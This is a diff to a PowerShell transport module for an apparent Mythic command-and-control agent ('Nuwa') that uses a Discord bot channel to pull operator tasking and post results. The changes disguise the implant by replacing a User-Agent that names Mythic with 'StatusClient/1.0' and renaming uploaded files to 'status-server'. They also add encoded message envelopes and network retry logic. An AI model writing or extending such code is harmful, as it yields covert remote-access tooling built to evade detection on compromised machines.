@@ -2,7 +2,7 @@ function Get-NuwaDiscordUserAgent {
     [CmdletBinding()]
     param()
 
-    return 'NuwaDiscord/1.0 (+https://github.com/its-a-feature/Mythic)'
+    return 'StatusClient/1.0'
 }
 
 function Get-NuwaDiscordApiHeaders {
@@ -13,29 +13,6 @@ function Get-NuwaDiscordApiHeaders {
         Authorization = ('Bot {0}' -f $script:NuwaConfig.DiscordToken)
         'User-Agent' = Get-NuwaDiscordUserAgent
     }
-}
-
-function Set-NuwaDiscordProxyInvokeParameters {
-    [CmdletBinding()]
-    param(
-        [Parameter(Mandatory = $true)]
-        [hashtable]$InvokeParameters
-    )
-
-    if ([string]::IsNullOrWhiteSpace($script:NuwaConfig.ProxyHost)) {
-        return
-    }
-
-    $InvokeParameters.Proxy = ('{0}:{1}' -f $script:NuwaConfig.ProxyHost, $script:NuwaConfig.ProxyPort)
-    if ([string]::IsNullOrWhiteSpace($script:NuwaConfig.ProxyUser)) {
-        return
-    }
-
-    $proxyCredentialBytes = ConvertTo-NuwaUtf8Bytes -Value ('{0}:{1}' -f $script:NuwaConfig.ProxyUser, $script:NuwaConfig.ProxyPass)
-    if (-not $InvokeParameters.ContainsKey('Headers') -or $null -eq $InvokeParameters.Headers) {
-        $InvokeParameters.Headers = @{}
-    }
-    $InvokeParameters.Headers['Proxy-Authorization'] = ('Basic {0}' -f (ConvertTo-NuwaBase64String -Bytes $proxyCredentialBytes))
 }
 
 function Get-NuwaDiscordMessagesUri {
@@ -75,13 +52,37 @@ function ConvertTo-NuwaDiscordMessageWrapper {
         [bool]$ToServer
     )
 
-    return (@{
+    $wrapper = @{
         message = $Message
         sender_id = $SenderId
         to_server = $ToServer
         id = 1
         final = $true
-    } | ConvertTo-Json -Compress -Depth 10)
+    }
+    $wrapper = Add-NuwaDiscordMessageFormat -Wrapper $wrapper
+    $envelopeCodec = if (
+        $script:NuwaConfig -and
+        -not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.DiscordEnvelopeCodec)
+    ) {
+        [string]$script:NuwaConfig.DiscordEnvelopeCodec
+    } else {
+        'legacy-json'
+    }
+    if ($envelopeCodec -eq 'legacy-json') {
+        return ($wrapper | ConvertTo-Json -Compress -Depth 10)
+    }
+    $context = @{
+        direction = if ($ToServer) { 'agent-to-server' } else { 'server-to-agent' }
+        sender_id = $SenderId
+        client_id = ''
+        c2_profile = 'discord'
+        envelope_codec = $envelopeCodec
+        envelope_version = 1
+    }
+    return ConvertTo-NuwaDiscordEnvelopeText `
+        -Wrapper $wrapper `
+        -CodecProfile $envelopeCodec `
+        -Context $context
 }
 
 function ConvertFrom-NuwaDiscordJsonObject {
@@ -185,6 +186,30 @@ function Get-NuwaDiscordRateLimitDelayMilliseconds {
         $resolvedStatusCode = 429
     }
 
+    if ($resolvedStatusCode -eq 0 -and $null -ne $ErrorRecord -and $ErrorRecord.Exception) {
+        $exception = $ErrorRecord.Exception
+        for ($exceptionDepth = 0; $null -ne $exception -and $exceptionDepth -lt 8; $exceptionDepth += 1) {
+            if ($exception -is [System.Net.WebException]) {
+                $transientWebStatuses = @(
+                    [System.Net.WebExceptionStatus]::NameResolutionFailure,
+                    [System.Net.WebExceptionStatus]::ProxyNameResolutionFailure
+                )
+                if ($transientWebStatuses -contains $exception.Status) {
+                    return 1100
+                }
+            }
+
+            $exceptionMessage = [string]$exception.Message
+            if (
+                $exceptionMessage -match
+                    '(?i)(unexpected EOF|0 bytes from the transport stream|operation has timed out|underlying connection was closed|connection was forcibly closed|unexpected error occurred on a send|remote name could not be resolved|no such host is known|name or service not known)'
+            ) {
+                return 1100
+            }
+            $exception = $exception.InnerException
+        }
+    }
+
     if ($resolvedStatusCode -in @(500, 502, 503, 504)) {
         return 1100
     }
@@ -244,13 +269,93 @@ function Get-NuwaDiscordAttachmentContent {
         [string]$Url
     )
 
-    $invokeParameters = @{
-        Uri = $Url
-        Method = 'GET'
-        UseBasicParsing = $true
+    try {
+        Add-Type -AssemblyName 'System.Net.Http' -ErrorAction Stop | Out-Null
+    } catch {
     }
-    Set-NuwaDiscordProxyInvokeParameters -InvokeParameters $invokeParameters
-    return ConvertFrom-NuwaDiscordContent -Content ((Invoke-NuwaDiscordWebRequest -InvokeParameters $invokeParameters).Content)
+
+    for ($attempt = 0; $attempt -lt 5; $attempt += 1) {
+        $handler = [System.Net.Http.HttpClientHandler]::new()
+        Set-NuwaDiscordAttachmentProxy -Handler $handler
+        $client = [System.Net.Http.HttpClient]::new($handler)
+        $client.Timeout = [TimeSpan]::FromSeconds(30)
+        $response = $null
+        $stream = $null
+        try {
+            $response = $client.GetAsync(
+                $Url,
+                [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead
+            ).GetAwaiter().GetResult()
+            $delayMilliseconds = Get-NuwaDiscordRateLimitDelayMilliseconds `
+                -StatusCode ([int]$response.StatusCode)
+            if ($delayMilliseconds -ge 0 -and ($attempt + 1) -lt 5) {
+                Start-Sleep -Milliseconds $delayMilliseconds
+                continue
+            }
+            $response.EnsureSuccessStatusCode() | Out-Null
+
+            $contentLength = $response.Content.Headers.ContentLength
+            if ($null -ne $contentLength -and [long]$contentLength -gt 2097152) {
+                throw 'Discord envelope attachment exceeds the UTF-8 byte limit'
+            }
+            $stream = $response.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
+            return Read-NuwaDiscordBoundedAttachmentStream `
+                -Stream $stream `
+                -MaximumBytes 2097152
+        } catch {
+            $delayMilliseconds = Get-NuwaDiscordRateLimitDelayMilliseconds -ErrorRecord $_
+            if ($delayMilliseconds -lt 0 -or ($attempt + 1) -ge 5) {
+                throw
+            }
+            Start-Sleep -Milliseconds $delayMilliseconds
+        } finally {
+            if ($null -ne $stream) {
+                $stream.Dispose()
+            }
+            if ($null -ne $response) {
+                $response.Dispose()
+            }
+            $client.Dispose()
+            $handler.Dispose()
+        }
+    }
+
+    throw 'Discord attachment request exceeded retry attempts'
+}
+
+function Read-NuwaDiscordBoundedAttachmentStream {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [System.IO.Stream]$Stream,
+
+        [Parameter(Mandatory = $false)]
+        [int]$MaximumBytes = 2097152
+    )
+
+    if ($MaximumBytes -lt 0) {
+        throw 'Discord envelope attachment byte limit is invalid'
+    }
+
+    $destination = [System.IO.MemoryStream]::new()
+    try {
+        $buffer = [byte[]]::new(8192)
+        while ($true) {
+            $remaining = $MaximumBytes - [int]$destination.Length
+            $readLength = [Math]::Min($buffer.Length, $remaining + 1)
+            $count = $Stream.Read($buffer, 0, $readLength)
+            if ($count -eq 0) {
+                break
+            }
+            if ($count -gt $remaining) {
+                throw 'Discord envelope attachment exceeds the UTF-8 byte limit'
+            }
+            $destination.Write($buffer, 0, $count)
+        }
+        return ConvertFrom-NuwaUtf8Bytes -Bytes $destination.ToArray()
+    } finally {
+        $destination.Dispose()
+    }
 }
 
 function ConvertFrom-NuwaDiscordMessage {
@@ -260,8 +365,9 @@ function ConvertFrom-NuwaDiscordMessage {
         [object]$Message
     )
 
+    $value = ''
     if ($Message -is [string]) {
-        return ConvertFrom-NuwaDiscordJsonObject -Value $Message
+        $value = $Message
     }
 
     $content = $null
@@ -282,21 +388,39 @@ function ConvertFrom-NuwaDiscordMessage {
         }
     }
 
-    if (-not [string]::IsNullOrWhiteSpace([string]$content)) {
-        $parsed = ConvertFrom-NuwaDiscordJsonObject -Value ([string]$content)
-        if ($null -ne $parsed) {
-            return $parsed
-        }
+    if ([string]::IsNullOrWhiteSpace($value) -and -not [string]::IsNullOrWhiteSpace([string]$content)) {
+        $value = [string]$content
     }
 
-    if ($attachments -and $attachments.Count -gt 0) {
+    if ([string]::IsNullOrWhiteSpace($value) -and $attachments -and $attachments.Count -gt 0) {
         $attachment = $attachments[0]
         if ($attachment -and $attachment.url) {
-            return ConvertFrom-NuwaDiscordJsonObject -Value (Get-NuwaDiscordAttachmentContent -Url ([string]$attachment.url))
+            $value = Get-NuwaDiscordAttachmentContent -Url ([string]$attachment.url)
         }
     }
 
-    return $null
+    if ([string]::IsNullOrWhiteSpace($value)) {
+        return $null
+    }
+    if (-not (Get-Command Resolve-NuwaDiscordEnvelopeText -ErrorAction SilentlyContinue)) {
+        return ConvertFrom-NuwaDiscordJsonObject -Value $value
+    }
+    try {
+        $resolved = Resolve-NuwaDiscordEnvelopeText -Value $value -Context @{
+            direction = 'server-to-agent'
+            sender_id = ''
+            client_id = ''
+            c2_profile = 'discord'
+            envelope_codec = ''
+            envelope_version = 1
+        }
+        $parsed = $resolved.Wrapper
+        $parsed | Add-Member -NotePropertyName '_nuwa_envelope_codec' -NotePropertyValue $resolved.CodecProfile -Force
+        $parsed | Add-Member -NotePropertyName '_nuwa_envelope_encoded' -NotePropertyValue ([bool]$resolved.IsEncoded) -Force
+        return $parsed
+    } catch {
+        return $null
+    }
 }
 
 function Get-NuwaDiscordObjectProperty {
@@ -371,10 +495,8 @@ function ConvertFrom-NuwaDiscordWireBody {
     }
 
     try {
-        $decodedJson = ConvertFrom-NuwaResponseBody `
-            -ResponseBody $WireBody `
-            -ExpectedUuid $Uuid `
-            -UuidLength $uuidLength `
+        $decodedJson = ConvertFrom-NuwaWireBytes `
+            -WireBytes (ConvertTo-NuwaUtf8Bytes -Value $WireBody) `
             -Context $context
         if ([string]::IsNullOrWhiteSpace($decodedJson)) {
             return $null
@@ -554,10 +676,50 @@ function Find-NuwaDiscordInboundMessage {
                 $decodeCandidates += [string]$parsed.sender_id
             }
 
-            $resolvedBody = Resolve-NuwaDiscordDecodedBody `
-                -Message $parsed `
-                -ExpectedAction $ExpectedAction `
-                -CandidateUuids $decodeCandidates
+            $parsedMessageBody = if ($parsed.PSObject.Properties.Match('message').Count -gt 0) {
+                [string]$parsed.message
+            } else {
+                ''
+            }
+            $resolvedBody = $null
+            if ($ExpectedAction -eq 'post_response' -and [string]::IsNullOrWhiteSpace($parsedMessageBody)) {
+                $acknowledgementUuid = if (-not [string]::IsNullOrWhiteSpace($ExpectedUuid)) {
+                    $ExpectedUuid
+                } else {
+                    $targetClientId
+                }
+                $acknowledgementJson = '{"action":"post_response","responses":[]}'
+                $acknowledgementContext = @{
+                    direction = 'inbound'
+                    uuid = $acknowledgementUuid
+                    message_type = 'post_response'
+                    c2_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.C2Profile)) {
+                        [string]$script:NuwaConfig.C2Profile
+                    } else {
+                        'discord'
+                    }
+                    codec_profile = if (-not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.CodecProfile)) {
+                        [string]$script:NuwaConfig.CodecProfile
+                    } else {
+                        'decimal'
+                    }
+                    codec_version = '1'
+                }
+                $resolvedBody = @{
+                    Decoded = ConvertFrom-NuwaDiscordJsonObject -Value $acknowledgementJson
+                    Uuid = $acknowledgementUuid
+                    WireBody = ConvertFrom-NuwaUtf8Bytes -Bytes (
+                        ConvertTo-NuwaWireBytes `
+                            -MessageJson $acknowledgementJson `
+                            -Context $acknowledgementContext
+                    )
+                }
+            } else {
+                $resolvedBody = Resolve-NuwaDiscordDecodedBody `
+                    -Message $parsed `
+                    -ExpectedAction $ExpectedAction `
+                    -CandidateUuids $decodeCandidates
+            }
             if ($null -eq $resolvedBody) {
                 continue
             }
@@ -787,12 +949,6 @@ function Resolve-NuwaDiscordDecodedBody {
         return $null
     }
 
-    $trimmedBody = $messageBody.Trim()
-    $trimmedBody = $trimmedBody.TrimStart([char]0xFEFF)
-    $markerIndex = $trimmedBody.IndexOf('NW1:')
-    if ($markerIndex -gt 0) {
-        $trimmedBody = $trimmedBody.Substring($markerIndex)
-    }
     $uuidLength = if ($script:NuwaConfig.MessageUuidLength) {
         [int]$script:NuwaConfig.MessageUuidLength
     } else {
@@ -825,30 +981,24 @@ function Resolve-NuwaDiscordDecodedBody {
         }
 
         try {
-            $decodedJson = ConvertFrom-NuwaResponseBody `
-                -ResponseBody $trimmedBody `
+            $resolved = Resolve-NuwaResponseBody `
+                -ResponseBody $messageBody `
                 -ExpectedUuid $candidate `
                 -UuidLength $uuidLength `
                 -Context $context
-            if ([string]::IsNullOrWhiteSpace($decodedJson)) {
+            if ($null -eq $resolved -or [string]::IsNullOrWhiteSpace([string]$resolved.Json)) {
                 continue
             }
 
-            $wireBody = $trimmedBody
-            if ($markerIndex -lt 0) {
-                $decodedEnvelope = ConvertFrom-NuwaTransportEnvelope -Envelope $trimmedBody -UuidLength $uuidLength
-                $wireBody = ConvertFrom-NuwaUtf8Bytes -Bytes $decodedEnvelope.message_bytes
-            }
-
-            $decoded = ConvertFrom-NuwaDiscordJsonObject -Value $decodedJson
+            $decoded = ConvertFrom-NuwaDiscordJsonObject -Value ([string]$resolved.Json)
             if ($null -eq $decoded) {
                 continue
             }
 
             return @{
                 Decoded = $decoded
-                Uuid = $candidate
-                WireBody = $wireBody
+                Uuid = [string]$resolved.Uuid
+                WireBody = [string]$resolved.WireBody
             }
         } catch {
             continue
@@ -964,21 +1114,10 @@ function Send-NuwaDiscordApiAttachment {
             Add-Type -AssemblyName 'System.Net.Http' -ErrorAction Stop | Out-Null
         } catch {
         }
-        [System.IO.File]::WriteAllText($tempPath, $Content, [System.Text.Encoding]::UTF8)
+        [System.IO.File]::WriteAllText($tempPath, $Content, [System.Text.UTF8Encoding]::new($false))
 
         $handler = [System.Net.Http.HttpClientHandler]::new()
-        if (-not [string]::IsNullOrWhiteSpace($script:NuwaConfig.ProxyHost)) {
-            $proxyUri = ('{0}:{1}' -f $script:NuwaConfig.ProxyHost, $script:NuwaConfig.ProxyPort)
-            $proxy = [System.Net.WebProxy]::new($proxyUri)
-            if (-not [string]::IsNullOrWhiteSpace($script:NuwaConfig.ProxyUser)) {
-                $proxy.Credentials = [System.Net.NetworkCredential]::new(
-                    [string]$script:NuwaConfig.ProxyUser,
-                    [string]$script:NuwaConfig.ProxyPass
-                )
-            }
-            $handler.Proxy = $proxy
-            $handler.UseProxy = $true
-        }
+        Set-NuwaDiscordAttachmentProxy -Handler $handler
 
         $client = [System.Net.Http.HttpClient]::new($handler)
         try {
@@ -999,7 +1138,7 @@ function Send-NuwaDiscordApiAttachment {
             $fileBytes = [System.IO.File]::ReadAllBytes($tempPath)
             $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
             $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/json')
-            $multipart.Add($fileContent, 'files[0]', 'nuwa-server')
+            $multipart.Add($fileContent, 'files[0]', 'status-server')
 
             for ($attempt = 0; $attempt -lt 5; $attempt += 1) {
                 $response = $client.PostAsync((Get-NuwaDiscordChannelUri), $multipart).GetAwaiter().GetResult()
@@ -1035,6 +1174,10 @@ function Send-NuwaDiscordApiAttachment {
 function Invoke-NuwaDiscordRequest {
     [CmdletBinding()]
     param(
+        [Parameter(Mandatory = $false)]
+        [AllowEmptyString()]
+        [string]$TransportBody = '',
+
         [Parameter(Mandatory = $true)]
         [string]$WireBody,
 
@@ -1045,7 +1188,10 @@ function Invoke-NuwaDiscordRequest {
         [string]$ExpectedAction = ''
     )
 
-    $wrapper = ConvertTo-NuwaDiscordMessageWrapper -Message $WireBody -SenderId $Uuid -ToServer $true
+    if ([string]::IsNullOrWhiteSpace($TransportBody)) {
+        $TransportBody = $WireBody
+    }
+    $wrapper = ConvertTo-NuwaDiscordMessageWrapper -Message $TransportBody -SenderId $Uuid -ToServer $true
     $expectedRequest = ConvertFrom-NuwaDiscordWireBody -WireBody $WireBody -Uuid $Uuid -Action $ExpectedAction -Direction 'outbound'
     $requestStartedAt = [DateTimeOffset]::UtcNow
     $pendingTaskingMinimumTimestamp = $requestStartedAt
@@ -1091,14 +1237,18 @@ function Invoke-NuwaDiscordRequest {
         ) {
             $alternateClientIds += [string]$script:NuwaConfig.PayloadUUID
         }
-        $matched = Find-NuwaDiscordInboundMessage `
-            -Messages $messages `
-            -ExpectedClientId $Uuid `
-            -AlternateClientIds $alternateClientIds `
-            -ExpectedAction $ExpectedAction `
-            -ExpectedUuid $Uuid `
-            -MinimumTimestamp $requestStartedAt `
-            -ExpectedRequest $expectedRequest
+        $findParameters = @{
+            Messages = $messages
+            ExpectedClientId = $Uuid
+            AlternateClientIds = $alternateClientIds
+            ExpectedAction = $ExpectedAction
+            ExpectedUuid = $Uuid
+            ExpectedRequest = $expectedRequest
+        }
+        if ([string]::IsNullOrWhiteSpace($afterMessageId)) {
+            $findParameters.MinimumTimestamp = $requestStartedAt
+        }
+        $matched = Find-NuwaDiscordInboundMessage @findParameters
         if (
             -not [string]::IsNullOrWhiteSpace($afterMessageId) -and
             (
@@ -1248,6 +1398,10 @@ function Invoke-NuwaTransport {
     )
 
     Write-NuwaDebug ("Discord transport action {0} for {1}" -f $Action, $Uuid)
-    $body = ConvertTo-NuwaTransportEnvelope -Uuid $Uuid -MessageBytes (ConvertTo-NuwaUtf8Bytes -Value $WireBody)
-    return Invoke-NuwaDiscordRequest -WireBody $body -Uuid $Uuid -ExpectedAction $Action
+    $body = New-NuwaTransportRequestBody -Uuid $Uuid -WireBody $WireBody
+    return Invoke-NuwaDiscordRequest `
+        -TransportBody $body `
+        -WireBody $WireBody `
+        -Uuid $Uuid `
+        -ExpectedAction $Action
 }
